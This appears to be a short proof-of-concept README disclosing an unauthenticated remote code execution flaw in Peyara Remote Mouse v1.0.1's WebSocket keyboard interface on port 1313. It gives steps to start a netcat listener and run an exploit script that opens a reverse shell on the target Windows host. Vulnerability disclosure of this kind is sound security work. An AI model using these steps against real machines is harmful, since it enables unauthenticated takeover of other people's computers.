## Peyara Remote Mouse v1.0.1 - Remote Code Execution (RCE)

### Vulnerability Description
Peyara Remote Mouse v1.0.1 contains an unauthenticated remote code execution vulnerability in its WebSocket command interface (port 1313). The application fails to validate or sanitize simulated keyboard input commands received via WebSocket connections, allowing attackers to chain malicious keyboard events that execute arbitrary system commands. This vulnerability can be exploited remotely without authentication to gain full system compromise.
### Steps:

1. **Install Vulnerable Application**  
   Download and install Peyara Remote Mouse on the target Windows system.

2. **Start Netcat Listener**  
   Open a terminal and execute:
      ```bash
   nc -nlvp 4444
      ```
3. **Execute Exploit Script**
```bash
python3 Peyara.py --target 192.168.1.107 --lhost 192.168.1.110 --lport 4444
```

<img src="https://raw.githubusercontent.com/capture0x/Peyara/refs/heads/main/peyara1.png" width="100%"></img>

 


